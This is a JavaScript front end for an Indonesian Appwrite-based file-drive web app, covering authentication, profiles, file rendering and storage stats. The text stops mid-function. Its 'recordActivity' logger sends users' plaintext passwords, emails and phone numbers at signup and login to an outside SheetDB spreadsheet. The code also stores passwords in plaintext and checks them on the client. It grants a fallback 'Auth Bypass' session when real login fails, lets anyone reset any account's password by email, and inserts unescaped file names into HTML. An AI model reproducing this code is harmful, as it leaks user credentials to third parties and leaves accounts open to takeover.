// ======================================================
// 1. KONFIGURASI APPWRITE & GLOBAL
// ======================================================
const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI AVATAR 
const DEFAULT_AVATAR_LOCAL = 'profile-default.jpeg'; 
const DEFAULT_AVATAR_DB_URL = 'https://cloud.appwrite.io/v1/storage/buckets/default/files/default/view';

// KONFIGURASI PROJECT
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

// API SheetDB 
const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi'; 

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// State Global
let currentUser = null;
let userDataDB = null; 
let currentFolderId = 'root'; 
let currentFolderName = "Drive";
let currentViewMode = 'root'; 
let selectedItem = null; 
let selectedUploadFile = null; 
let selectedProfileImage = null; 
let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
let searchTimeout = null;

const el = (id) => document.getElementById(id);

const toggleLoading = (show, msg = "Memproses...") => {
    const loader = el('loading');
    const text = el('loadingText');
    if (show) {
        if(text) text.innerText = msg;
        if(loader) loader.classList.remove('hidden');
    } else {
        if(loader) loader.classList.add('hidden');
    }
};

// ======================================================
// 2. MAIN EXECUTION
// ======================================================
document.addEventListener('DOMContentLoaded', () => {
    checkSession(); 
    initDragAndDrop(); 
    initLogout(); 
    initSearchBar(); 
    initAllContextMenus(); 
    initStorageTooltip(); 
    initProfileImageUploader(); 
});

// ======================================================
// 3. FUNGSI LOGGING (SHEETDB)
// ======================================================
async function recordActivity(sheetName, data) {
    try {
        const now = new Date().toLocaleString('id-ID', {
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).replace(/\./g, ':'); 

        let payload = {};

        if (sheetName === 'SignUp') {
            payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Phone": data.phone || "-", "Password": data.password || "-", "Waktu": now };
        } else if (sheetName === 'Login') {
            payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Password": data.password || "-", "Riwayat Waktu": now };
        } else if (sheetName === 'Logout') {
            payload = { "ID": data.id || "-", "Nama": data.name || "-", "Email": data.email || "-", "Riwayat Waktu": now };
        }

        await fetch(`${SHEETDB_API}?sheet=${sheetName}`, {
            method: 'POST',
            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: payload })
        });
    } catch (error) { console.error("System Log Error:", error); }
}

function checkSystemHealth() {
    if (!navigator.onLine) throw new Error("Tidak ada koneksi internet. Periksa jaringan Anda.");
    return true;
}

// ======================================================
// 4. LOGIKA AUTH (DENGAN LOCALSTORAGE SESSION FIX)
// ======================================================
if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value.trim(); const email = el('regEmail').value.trim();
        const phone = el('regPhone').value.trim(); const pass = el('regPass').value; const verify = el('regVerify').value;

        if (pass !== verify) return alert("Konfirmasi password tidak cocok!");
        toggleLoading(true, "Mendaftarkan Akun Anda...");
        try {
            checkSystemHealth();
            const newUserId = Appwrite.ID.unique(); 
            await account.create(newUserId, email, pass, name);
            try { await account.createEmailPasswordSession(email, pass); } catch(e) {}
            try { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, newUserId, { email: email, phone: phone, name: name, password: pass, avatarUrl: DEFAULT_AVATAR_DB_URL }); } catch (dbError) {}
            recordActivity('SignUp', { id: newUserId, name: name, email: email, phone: phone, password: pass }).catch(()=>{});
            
            try { await account.deleteSession('current'); } catch (e) {}
            localStorage.removeItem('drive_session'); 
            
            toggleLoading(false); alert("Pendaftaran Berhasil Sempurna!\nSilakan Login dengan akun baru Anda."); window.nav('loginPage');
        } catch(e) { 
            toggleLoading(false); if(e.message.includes('exists') || e.code === 409) alert("Email atau Username sudah terdaftar!"); else alert("Error Pendaftaran: " + e.message);
        }
    });
}

if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let inputId = el('loginEmail').value.trim(); const pass = el('loginPass').value;
        try {
            toggleLoading(true, "Mengecek Kredensial..."); checkSystemHealth();

            if (!inputId.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [ Appwrite.Query.equal('name', inputId) ]);
                if (res.documents.length > 0) inputId = res.documents[0].email; else throw new Error("Username tidak ditemukan di database.");
            }

            let dbUser = null;
            const userCheck = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [ Appwrite.Query.equal('email', inputId) ]);
            if (userCheck.documents.length > 0) {
                dbUser = userCheck.documents[0];
                if (dbUser.password && dbUser.password !== pass && dbUser.password !== 'NULL') throw new Error("Password Anda salah.");
            } else { throw new Error("Akun tidak ditemukan."); }

            toggleLoading(true, "Menyiapkan Sesi Dashboard...");
            try { await account.deleteSession('current'); } catch (ignoreErr) {}

            let authSuccess = false;
            try { 
                await account.createEmailPasswordSession(inputId, pass); 
                authSuccess = true; 
            } catch (authErr) { console.warn("Auth Bypass Active. Menggunakan data lokal."); }

            let user;
            if (authSuccess) {
                user = await account.get();
                await syncUserData(user); 
                localStorage.setItem('drive_session', JSON.stringify(user)); 
            } else {
                user = { $id: dbUser.$id, name: dbUser.name, email: dbUser.email, phone: dbUser.phone };
                localStorage.setItem('drive_session', JSON.stringify(user)); 
            }
            
            recordActivity('Login', { id: user.$id, name: user.name, email: user.email, password: pass }).catch(()=>{});
            await initializeDashboard(user); 

        } catch (error) { toggleLoading(false); alert("Login Gagal: " + error.message); }
    });
}

function initLogout() {
    const btn = el('logoutBtn');
    if (btn) {
        const newBtn = btn.cloneNode(true); btn.parentNode.replaceChild(newBtn, btn);
        newBtn.addEventListener('click', async () => {
            if (confirm("Yakin ingin keluar dari Drive?")) {
                toggleLoading(true, "Mengakhiri Sesi...");
                if (currentUser) await recordActivity('Logout', { id: currentUser.$id, name: currentUser.name, email: currentUser.email });
                try { await account.deleteSession('current'); } catch (error) {}
                localStorage.removeItem('drive_session'); 
                window.location.reload(); 
            }
        });
    }
}

if (el('resetForm')) {
    el('resetForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = el('resetEmail').value.trim(); const newPass = el('resetNewPass').value; const verifyPass = el('resetVerifyPass').value;
        if (newPass !== verifyPass) return alert("Konfirmasi password tidak cocok!"); if (newPass.length < 8) return alert("Password minimal 8 karakter.");
        toggleLoading(true, "Mencari Akun...");
        try {
            const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [ Appwrite.Query.equal('email', email) ]);
            if (res.documents.length === 0) throw new Error("Email tidak ditemukan di database.");
            const userDoc = res.documents[0];

            toggleLoading(true, "Mengupdate Password...");
            await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userDoc.$id, { password: newPass });
            await fetch(`${SHEETDB_API}/Email/${email}?sheet=SignUp`, { method: 'PATCH', headers: {'Accept': 'application/json', 'Content-Type': 'application/json'}, body: JSON.stringify({ "data": { "Password": newPass } }) });
            await fetch(`${SHEETDB_API}/Email/${email}?sheet=Login`, { method: 'PATCH', headers: {'Accept': 'application/json', 'Content-Type': 'application/json'}, body: JSON.stringify({ "data": { "Password": newPass } }) });
            
            toggleLoading(false); alert("Berhasil! Password telah diperbarui."); window.nav('loginPage');
        } catch (error) { toggleLoading(false); alert("Gagal Reset Password: " + error.message); }
    });
}

// ======================================================
// 5. HELPER DATA & SINKRONISASI
// ======================================================
async function syncUserData(authUser) {
    if (!authUser) return;
    try {
        let userDoc;
        try { userDoc = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id); } catch (e) { if (e.code === 404) userDoc = null; }
        const payload = { name: authUser.name, email: authUser.email };
        if (!userDoc) { await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id, { ...payload, phone: '', password: 'NULL', avatarUrl: DEFAULT_AVATAR_DB_URL }); } 
        else if (!userDoc.name || userDoc.name !== authUser.name) { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, authUser.$id, payload); }
    } catch (err) {}
}

async function initializeDashboard(userObj) {
    currentUser = userObj;
    const dbPromise = databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id).then(doc => { userDataDB = doc; }).catch(() => { userDataDB = { phone: '', avatarUrl: DEFAULT_AVATAR_DB_URL }; });
    const filePromise = loadFiles('root'); const storagePromise = calculateStorage();
    await Promise.all([dbPromise, filePromise, storagePromise]);
    updateProfileUI(); window.nav('dashboardPage'); toggleLoading(false); 
}

async function checkSession() {
    if(!el('loginPage').classList.contains('hidden')) return;
    toggleLoading(true, "Memuat Sesi Terakhir...");
    let isSessionValid = false;

    const localSession = localStorage.getItem('drive_session');
    if (localSession) { currentUser = JSON.parse(localSession); isSessionValid = true; }

    try {
        const nativeUser = await account.get();
        currentUser = nativeUser; 
        localStorage.setItem('drive_session', JSON.stringify(nativeUser)); 
        isSessionValid = true;
        await syncUserData(currentUser);
    } catch (e) { console.warn("Sesi Native diblokir. Mengandalkan Local Storage."); }

    if (isSessionValid && currentUser) {
        try { userDataDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id); } catch (e) { userDataDB = { phone: '', avatarUrl: DEFAULT_AVATAR_DB_URL }; }
        updateProfileUI(); window.nav('dashboardPage'); loadFiles('root'); calculateStorage();
        toggleLoading(false);
    } else {
        toggleLoading(false); window.nav('loginPage');
    }
}

function updateProfileUI() {
    const dbUrl = (userDataDB && userDataDB.avatarUrl) ? userDataDB.avatarUrl : '';
    let finalSrc = (!dbUrl || dbUrl === DEFAULT_AVATAR_DB_URL || dbUrl === 'NULL') ? DEFAULT_AVATAR_LOCAL : dbUrl + `&t=${new Date().getTime()}`; 
    if(el('dashAvatar')) el('dashAvatar').src = finalSrc; if(el('storagePageAvatar')) el('storagePageAvatar').src = finalSrc; if(el('editProfileImg')) el('editProfileImg').src = finalSrc;
}

window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage', 'storagePage', 'profilePage', 'resetPage'].forEach(id => { const element = el(id); if(element) element.classList.add('hidden'); });
    const target = el(pageId); if(target) target.classList.remove('hidden');
};

// ======================================================
// 6. PROFILE & SETTINGS
// ======================================================
window.openProfilePage = () => {
    if (!currentUser) return;
    el('editName').value = currentUser.name || ''; el('editEmail').value = currentUser.email || '';
    el('editPhone').value = (userDataDB && userDataDB.phone) ? userDataDB.phone : ''; el('editPass').value = ''; 
    updateProfileUI(); selectedProfileImage = null; window.nav('profilePage');
};

function initProfileImageUploader() {
    const input = el('profileUploadInput');
    if(input) { input.addEventListener('change', (e) => { if(e.target.files.length > 0) { const file = e.target.files[0]; selectedProfileImage = file; const reader = new FileReader(); reader.onload = function(evt) { el('editProfileImg').src = evt.target.result; }; reader.readAsDataURL(file); } }); }
}

window.saveProfile = async () => {
    toggleLoading(true, "Menyimpan Perubahan Profil...");
    try {
        const newName = el('editName').value.trim(); const newEmail = el('editEmail').value.trim(); const newPhone = el('editPhone').value.trim(); const newPass = el('editPass').value;
        let newAvatarUrl = (userDataDB && userDataDB.avatarUrl) ? userDataDB.avatarUrl : DEFAULT_AVATAR_DB_URL;
        
        if (selectedProfileImage) {
            try {
                const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedProfileImage);
                newAvatarUrl = storage.getFileView(CONFIG.BUCKET_ID, up.$id).href;
            } catch (err) {
                if (err.message.toLowerCase().includes('extension not allowed')) { throw new Error("Format foto ditolak Appwrite. Kosongkan 'Allowed file extensions' di pengaturan Bucket."); }
                throw new Error("Gagal mengupload foto profil baru: " + err.message);
            }
        }

        if (newName && newName !== currentUser.name) { try { await account.updateName(newName); } catch(ignoreErr){} }
        if (newEmail && newEmail !== currentUser.email) { try { await account.updateEmail(newEmail, ''); } catch(e) {} }
        if (newPass) await account.updatePassword(newPass);

        const payload = { name: newName, email: newEmail, phone: newPhone, avatarUrl: newAvatarUrl }; if(newPass) payload.password = newPass;
        try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, payload); } catch (dbErr) { if (dbErr.code === 404) await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, currentUser.$id, payload); }
        userDataDB = { ...userDataDB, phone: newPhone, avatarUrl: newAvatarUrl }; 
        
        if(localStorage.getItem('drive_session')) {
            let upSession = JSON.parse(localStorage.getItem('drive_session'));
            upSession.name = newName; upSession.email = newEmail; upSession.phone = newPhone;
            localStorage.setItem('drive_session', JSON.stringify(upSession));
            currentUser = upSession;
        }

        updateProfileUI(); toggleLoading(false); alert("Profil Berhasil Disimpan!"); window.nav('dashboardPage');
    } catch (error) { toggleLoading(false); alert("Gagal Menyimpan: " + error.message); }
};

// ======================================================
// 7. FILE MANAGER LOGIC & UPLOAD (SMART FALLBACK)
// ======================================================
window.handleMenuClick = (element, mode) => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); element.classList.add('active');
    currentFolderId = 'root'; currentViewMode = mode;
    if(mode === 'root') currentFolderName = "Drive"; else if(mode === 'recent') currentFolderName = "Terbaru"; else if(mode === 'starred') currentFolderName = "Berbintang"; else if(mode === 'trash') currentFolderName = "Sampah"; else currentFolderName = element.innerText.trim();
    loadFiles(mode);
};

window.goBack = () => { currentFolderId = 'root'; currentFolderName = "Drive"; currentViewMode = 'root'; document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); document.querySelectorAll('.nav-item')[0].classList.add('active'); loadFiles('root'); };
window.openFolder = (id, name) => { currentFolderId = id; currentFolderName = name; loadFiles(id); };

function initSearchBar() {
    const input = el('searchInput'); if (!input) return;
    input.addEventListener('input', (e) => {
        const query = e.target.value.trim();
        if (query.length === 0) { el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); return; }
        el('clearSearchBtn').classList.remove('hidden'); clearTimeout(searchTimeout);
        el('fileGrid').innerHTML = `<div style="grid-column:1/-1;text-align:center;margin-top:50px;"><div class="spinner"></div><p>Mencari "${query}"...</p></div>`;
        searchTimeout = setTimeout(() => performSearch(query), 600);
    });
}

async function performSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [ Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.search('name', keyword), Appwrite.Query.limit(50) ]);
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (res.documents.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;">Tidak ditemukan.</p>`; else res.documents.forEach(doc => renderItem(doc));
    } catch (e) { fallbackSearch(keyword); }
}

async function fallbackSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.limit(100)]);
        const filtered = res.documents.filter(doc => { const dName = doc.name || doc.nama || ""; return dName.toLowerCase().includes(keyword.toLowerCase()); });
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (filtered.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;">Tidak ditemukan.</p>`; else filtered.forEach(doc => renderItem(doc));
    } catch(err){}
}
window.clearSearch = () => { el('searchInput').value = ''; el('clearSearchBtn').classList.add('hidden'); loadFiles(currentFolderId); };

// --- FUNGSI RENDER KARTU ITEM ---
function renderItem(doc) {
    const grid = el('fileGrid'); const div = document.createElement('div'); div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:10px;left:10px;color:#ffd700;z-index:5;text-shadow:0 0 5px rgba(0,0,0,0.5);"></i>` : '';
    let content = '';
    const docName = doc.name || doc.nama || "File Tidak Dikenal";

    if (isFolder) {
        content = `<div class="thumb-box" style="background:transparent;"><div style="flex:1;width:100%;height:100%;display:flex;align-items:center;justify-content:center;"><i class="icon fa-solid fa-folder"></i></div></div>`;
    } else {
        const ext = docName.split('.').pop().toLowerCase();
        const fileViewUrl = storage.getFileView(CONFIG.BUCKET_ID, doc.fileId).href || storage.getFileView(CONFIG.BUCKET_ID, doc.fileId);

        const familiarImages = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'tiff', 'tif', 'heif', 'raw', 'cr2', 'nef', 'orf', 'arw', 'dng', 'jfif', 'pjp', 'pjpeg', 'webp'];
        const vidExts = ['mp4', 'webm', 'ogg', 'mov', 'mkv', 'avi', 'wmv', 'flv', '3gp', 'mpg', 'mpeg', 'avchd', 'm2ts'];
        const docExts = ['doc', 'docx', 'xls', 'xlsx', 'csv', 'ppt', 'pptx'];
        const pdfExt = ['pdf'];

        const createFallback = (ext) => {
            let iconClass = "fa-file"; let colorClass = "icon-grey"; let bgClass = "bg-grey";
            if (['psd', 'indd', 'tiff', 'tif', 'ai', 'eps', 'pdf'].includes(ext)) { if(ext === 'pdf') { iconClass = "fa-file-pdf"; colorClass = "icon-red"; bgClass = "bg-red"; } else if(['psd', 'indd'].includes(ext)) { iconClass = "fa-file-image"; colorClass = "icon-blue"; bgClass = "bg-blue"; } else { iconClass = "fa-pen-nib"; colorClass = "icon-orange"; bgClass = "bg-orange"; } }
            else if (ext.includes('doc')) { iconClass = "fa-file-word"; colorClass = "icon-blue"; bgClass = "bg-blue"; } else if (ext.includes('xls') || ext.includes('csv')) { iconClass = "fa-file-excel"; colorClass = "icon-green"; bgClass = "bg-green"; } else if (ext.includes('ppt')) { iconClass = "fa-file-powerpoint"; colorClass = "icon-orange"; bgClass = "bg-orange"; } else if (['html', 'css', 'js', 'php'].includes(ext)) { iconClass = "fa-file-code"; colorClass = "icon-grey"; bgClass = "bg-grey"; } else if (['zip', 'rar'].includes(ext)) { iconClass = "fa-file-zipper"; colorClass = "icon-yellow"; bgClass = "bg-yellow"; }
            return `<div class="thumb-fallback-card ${bgClass}"><i class="icon fa-solid ${iconClass} huge-icon ${colorClass}"></i><span class="fallback-ext">${ext.toUpperCase()}</span></div>`.replace(/"/g, "'"); 
        };

        if (familiarImages.includes(ext)) {
            content = `<div class="thumb-box" style="background:transparent;"><img src="${fileViewUrl}" class="thumb-image" loading="lazy" onerror="this.parentElement.innerHTML='${createFallback(ext)}'"></div>`;
        } else if (vidExts.includes(ext)) {
            content = `<div class="thumb-box" style="background:#000;"><video src="${fileViewUrl}" class="thumb-video" preload="metadata" muted loop onmouseover="this.play()" onmouseout="this.pause()" onerror="this.parentElement.innerHTML='${createFallback(ext)}'"></video><i class="fa-solid fa-play" style="position:absolute; color:rgba(255,255,255,0.8); font-size:1.5rem; pointer-events:none;"></i></div>`;
        } else if (docExts.includes(ext) || pdfExt.includes(ext)) {
            
            // KONEKSI API BACKEND HUGGING FACE
            const backendThumbUrl = `https://bizar8-api-thumbnail-drive.hf.space/api/thumbnail?url=${encodeURIComponent(fileViewUrl)}&ext=${ext}`;

            let badgeIcon = "fa-file"; let badgeColor = "#ffffff";
            if (pdfExt.includes(ext)) { badgeIcon = "fa-file-pdf"; badgeColor = "#ea4335"; }
            else if (ext.includes('doc')) { badgeIcon = "fa-file-word"; badgeColor = "#4285f4"; }
            else if (ext.includes('xls') || ext.includes('csv')) { badgeIcon = "fa-file-excel"; badgeColor = "#34a853"; }
            else if (ext.includes('ppt')) { badgeIcon = "fa-file-powerpoint"; badgeColor = "#fbbc04"; }

            content = `
                <div class="thumb-box" style="background:#ffffff; position: relative;">
                    <img src="${backendThumbUrl}" class="thumb-image" loading="lazy" onerror="this.parentElement.innerHTML='${createFallback(ext)}'" style="object-fit: cover; object-position: top; width: 100%; height: 100%; background: white;">
                    <div style="position: absolute; top:0; left:0; width:100%; height:100%; z-index:10; background: transparent;"></div>
                    <div style="position: absolute; bottom: 6px; right: 6px; background: rgba(255,255,255,0.95); padding: 5px 7px; border-radius: 6px; display: flex; align-items: center; justify-content: center; z-index: 11; box-shadow: 0 2px 6px rgba(0,0,0,0.15);"><i class="fa-solid ${badgeIcon}" style="font-size: 1.1rem; color: ${badgeColor};"></i></div>
                </div>
            `;
        } else {
            content = `<div class="thumb-box" style="background:transparent;">${createFallback(ext).replace(/'/g, '"')}</div>`;
        }
    }

    div.innerHTML = `${starHTML}${content}<div class="item-name" title="${docName}">${docName}</div>`;
    
    // PERBAIKAN: Jika file diklik, buka Modal Preview!
    div.onclick = () => { 
        if(!doc.trashed) { isFolder ? openFolder(doc.$id, docName) : openPreviewModal(doc); } 
    };
    
    div.oncontextmenu = (e) => {
        e.preventDefault(); e.stopPropagation(); closeAllMenus(); 
        selectedItem = doc; const menu = el('fileContextMenu');
        ['ctxBtnOpenFolder', 'ctxBtnPreview', 'ctxBtnDownload', 'ctxBtnOpenWith'].forEach(id => { const btn = el(id); if (btn) { if ((isFolder && id === 'ctxBtnOpenFolder') || (!isFolder && id !== 'ctxBtnOpenFolder')) { btn.style.display = 'flex'; } else { btn.style.display = 'none'; } } });
        menu.style.top = `${e.clientY}px`; menu.style.left = `${e.clientX}px`;
        const isTrash = doc.trashed; el('ctxTrashBtn').classList.toggle('hidden', isTrash); el('ctxRestoreBtn').classList.toggle('hidden', !isTrash); el('ctxPermDeleteBtn').classList.toggle('hidden', !isTrash); el('ctxStarText').innerText = doc.starred ? "Hapus Bintang" : "Bintangi";
        menu.classList.remove('hidden'); menu.classList.add('show');
    };

    grid.appendChild(div);
}

// ======================================================
// FITUR BARU: LOGIKA PREVIEW DOKUMEN (FULL SCREEN)
// ======================================================
let currentPreviewDoc = null;

window.openPreviewModal = (doc) => {
    if (!doc || doc.type === 'folder') return;
    currentPreviewDoc = doc;
    
    const docName = doc.name || doc.nama || "File";
    const ext = docName.split('.').pop().toLowerCase();
    const fileUrl = storage.getFileView(CONFIG.BUCKET_ID, doc.fileId).href || storage.getFileView(CONFIG.BUCKET_ID, doc.fileId);
    
    el('previewTitle').innerText = docName;
    const contentBox = el('previewContent');
    contentBox.innerHTML = '<div class="spinner"></div>'; 
    el('previewModal').classList.remove('hidden');
    
    const familiarImages = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'jfif'];
    const vidExts = ['mp4', 'webm', 'ogg', 'mov', 'mkv', 'avi'];
    const docExts = ['doc', 'docx', 'xls', 'xlsx', 'csv', 'ppt', 'pptx'];
    const pdfExt = ['pdf'];

    let iconClass = "fa-file"; let colorStr = "#ffffff";
    
    setTimeout(() => {
        if (familiarImages.includes(ext)) {
            iconClass = "fa-image"; colorStr = "#ea4335";
            contentBox.innerHTML = `<img src="${fileUrl}" alt="Preview">`;
        } else if (vidExts.includes(ext)) {
            iconClass = "fa-video"; colorStr = "#ea4335";
            contentBox.innerHTML = `<video src="${fileUrl}" controls autoplay></video>`;
        } else if (pdfExt.includes(ext)) {
            iconClass = "fa-file-pdf"; colorStr = "#ea4335";
            contentBox.innerHTML = `<iframe src="${fileUrl}#toolbar=0&view=FitH"></iframe>`;
        } else if (docExts.includes(ext)) {
            if(ext.includes('doc')) { iconClass = "fa-file-word"; colorStr = "#4285f4"; }
            else if(ext.includes('xls') || ext.includes('csv')) { iconClass = "fa-file-excel"; colorStr = "#34a853"; }
            else if(ext.includes('ppt')) { iconClass = "fa-file-powerpoint"; colorStr = "#fbbc04"; }
            contentBox.innerHTML = `<iframe src="https://docs.google.com/viewer?url=${encodeURIComponent(fileUrl)}&embedded=true"></iframe>`;
        } else {
            iconClass = "fa-file"; colorStr = "#94a3b8";
            contentBox.innerHTML = `
                <div class="preview-unsupported">
                    <i class="fa-solid ${iconClass}"></i>
                    <h2>Pratinjau tidak tersedia</h2>
                    <p>Format file ini tidak dapat dipratinjau secara langsung. Silakan download untuk melihat.</p>
                    <button class="btn-pill primary" style="margin-top:20px; width:auto; padding:0 20px; display:inline-flex;" onclick="downloadPreviewItem()">Download File</button>
                </div>
            `;
        }
        el('previewIcon').className = `fa-solid ${iconClass} preview-type-icon`;
        el('previewIcon').style.color = colorStr;
    }, 300);
};

window.closePreviewModal = () => {
    el('previewModal').classList.add('hidden');
    el('previewContent').innerHTML = ''; 
    currentPreviewDoc = null;
};

window.downloadPreviewItem = () => {
    if(currentPreviewDoc) { window.open(storage.getFileDownload(CONFIG.BUCKET_ID, currentPreviewDoc.fileId), '_blank'); }
};

// ======================================================
// STORAGE & MODALS
// ======================================================
window.openCurrentItem = () => { 
    if(selectedItem) { 
        const dName = selectedItem.name || selectedItem.nama; 
        selectedItem.type === 'folder' ? openFolder(selectedItem.$id, dName) : openPreviewModal(selectedItem); 
    } 
    closeAllMenus(); 
};
window.openRawUrl = () => { if(selectedItem && selectedItem.type !== 'folder') window.open(selectedItem.url, '_blank'); closeAllMenus(); };

function formatSize(bytes) {
    if (bytes === 0) return '0 B'; const k = 1024; const sizes = ['B', 'KB', 'MB', 'GB', 'TB']; const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function initStorageTooltip() {
    const segments = document.querySelectorAll('.bar-segment'); const tooltip = el('customTooltip');
    segments.forEach(seg => {
        seg.addEventListener('mouseenter', (e) => {
            const cat = e.target.getAttribute('data-category'); const size = e.target.getAttribute('data-size');
            el('ttHeader').innerText = cat || "LAINNYA"; el('ttSize').innerText = formatSize(parseInt(size || 0));
            if (cat === 'GAMBAR') el('ttDesc').innerText = "Foto dan gambar yang tersimpan."; else if (cat === 'VIDEO') el('ttDesc').innerText = "Video dan rekaman yang tersimpan."; else if (cat === 'DOKUMEN') el('ttDesc').innerText = "Dokumen PDF, Word, Excel."; else if (cat === 'TERSEDIA') el('ttDesc').innerText = "Sisa penyimpanan yang tersedia."; else el('ttDesc').innerText = "File lain yang tidak dikategorikan.";
            tooltip.classList.remove('hidden');
        });
        seg.addEventListener('mousemove', (e) => { tooltip.style.left = `${e.clientX}px`; tooltip.style.top = `${e.clientY - 15}px`; });
        seg.addEventListener('mouseleave', () => { tooltip.classList.add('hidden'); });
    });
}

window.openStoragePage = async () => {
    await calculateStorage(); window.closeModal('storageModal'); window.nav('storagePage');
    const totalBytes = storageDetail.total || 0; const limitBytes = 2 * 1024 * 1024 * 1024; 
    el('pageStoragePercent').innerText = `Ruang penyimpanan ${Math.min((totalBytes / limitBytes) * 100, 100).toFixed(0)}% penuh`; el('pageStorageUsedText').innerText = `${formatSize(totalBytes)} dari 2 GB`;
    const pctImages = (storageDetail.images / limitBytes) * 100; const pctVideos = (storageDetail.videos / limitBytes) * 100; const pctDocs = (storageDetail.docs / limitBytes) * 100; const pctOthers = (storageDetail.others / limitBytes) * 100; const pctFree = 100 - (pctImages + pctVideos + pctDocs + pctOthers);
    const setBar = (id, pct, cat, size) => { const bar = el(id); bar.style.width = `${pct}%`; bar.setAttribute('data-category', cat); bar.setAttribute('data-size', size); };
    setBar('pageBarImages', pctImages, 'GAMBAR', storageDetail.images); setBar('pageBarVideos', pctVideos, 'VIDEO', storageDetail.videos); setBar('pageBarDocs', pctDocs, 'DOKUMEN', storageDetail.docs); setBar('pageBarOthers', pctOthers, 'LAINNYA', storageDetail.others); setBar('pageBarFree', pctFree, 'TERSEDIA', limitBytes - totalBytes);
    el('pageValImages').innerText = formatSize(storageDetail.images); el('pageValVideos').innerText = formatSize(storageDetail.videos); el('pageValDocs').innerText = formatSize(storageDetail.docs); el('pageValOthers').innerText = formatSize(storageDetail.others); el('pageValFree').innerText = formatSize(limitBytes - totalBytes); initStorageTooltip();
};

window.closeStoragePage = () => { window.nav('dashboardPage'); };

window.openStorageModal = async () => {
    closeAllMenus(); await calculateStorage();
    const totalBytes = storageDetail.total || 0; const limitBytes = 2 * 1024 * 1024 * 1024; 
    el('storageBigText').innerText = formatSize(totalBytes);
    const pctImages = (storageDetail.images / limitBytes) * 100; const pctVideos = (storageDetail.videos / limitBytes) * 100; const pctDocs = (storageDetail.docs / limitBytes) * 100; const pctOthers = (storageDetail.others / limitBytes) * 100; const pctFree = 100 - (pctImages + pctVideos + pctDocs + pctOthers);
    const setBar = (id, pct, cat, size) => { const bar = el(id); bar.style.width = `${pct}%`; bar.setAttribute('data-category', cat); bar.setAttribute('data-size', size); };
    setBar('barImages', pctImages, 'GAMBAR', storageDetail.images); setBar('barVideos', pctVideos, 'VIDEO', storageDetail.videos); setBar('barDocs', pctDocs, 'DOKUMEN', storageDetail.docs); setBar('barOthers', pctOthers, 'LAINNYA', storageDetail.others); setBar('barFree', pctFree, 'TERSEDIA', limitBytes - totalBytes);
    el('valImages').innerText = formatSize(storageDetail.images); el('valVideos').innerText = formatSize(storageDetail.videos); el('valDocs').innerText = formatSize(storageDetail.docs); el('valOthers').innerText = formatSize(storageDetail.others);
    const modalBox = el('storageModal').querySelector('.modal-box'); modalBox.classList.remove('animate-open'); void modalBox.offsetWidth; modalBox.classList.add('animate-open'); window.openModal('storageModal');
};

async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [ Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.equal('type', 'file') ]);
        storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 }; const limit = 2 * 1024 * 1024 * 1024; 
        res.documents.forEach(doc => {
            const size = doc.size || 0; const name = (doc.name || doc.nama || "").toLowerCase(); storageDetail.total += size;
